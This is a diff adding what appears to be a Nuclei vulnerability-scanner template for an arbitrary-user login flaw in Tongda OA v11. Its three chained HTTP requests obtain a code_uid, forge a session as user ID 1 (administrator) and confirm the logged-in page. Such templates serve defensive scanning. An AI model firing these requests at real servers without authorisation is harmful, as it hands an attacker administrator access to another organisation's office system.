@@ -1,0 +1,52 @@
+id: tongda-oa-login-code-arbitrary-login
+info:
+  name: tongda-oa-login-code-arbitrary-login
+  author: SleepingBag945
+  severity: high
+  description: 通达OA是一套办公系统。2020年04月17日, 通达OA官方在更新了一个v11版本安全补丁, 其中修复了一个任意用户伪造登录漏洞。 该漏洞类型为任意用户伪造，未经授权的远程攻击者可以通过精心构造的请求包进行任意用户伪造登录.登录之后可进一步上传恶意文件控制网站服务器。
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/通达OA/通达OA%20v11.5%20login_code.php%20任意用户登录.html
+  tags: tongda,oa
+
+http:
+  - raw:
+      - |
+        GET /general/login_code.php HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /logincheck_code.php HTTP/1.1
+        Host: {{Hostname}}
+
+        CODEUID={{uid}}&UID=1
+
+      - |
+        GET /general/index.php?isIE=0&modify_pwd=0 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID={{cookie}};
+
+
+    extractors:
+      - type: regex
+        name: uid
+        internal: true
+        group: 1
+        regex:
+          - '"code_uid":"(.*?)"'
+      - type: regex
+        name: cookie
+        internal: true
+        part: header
+        group: 1
+        regex:
+          - 'PHPSESSID=(.*?);'
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && contains(body_1, "\"code_uid\":\"{") && contains(body_1,"\"status\":1")'
+          - 'status_code_2 == 200 && contains(body_2,"index.php?isIE")'
+          - 'status_code_2 == 200 && contains(header_2,"Set-Cookie")'
+          - 'status_code_3 == 200 && !contains(body_3,"<title>用户未登录</title>")  && contains(body_3,"loginUser")'
+        condition: and
